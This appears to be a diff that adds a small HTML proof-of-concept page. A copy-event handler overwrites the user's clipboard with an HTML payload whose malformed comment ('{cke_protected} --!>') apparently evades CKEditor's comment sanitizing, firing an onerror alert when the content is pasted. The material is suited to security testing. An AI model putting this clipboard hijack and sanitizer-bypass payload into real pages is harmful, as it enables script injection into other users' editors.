@@ -1,0 +1,10 @@
+<script>
+
+   
+    document.oncopy = ev => {
+        ev.preventDefault();
+        ev.clipboardData.setData('text/html', "<!--{cke_protected} --!> <img src onerror=alert(1)>-->");
+       
+    }
+</script>
+18888888888
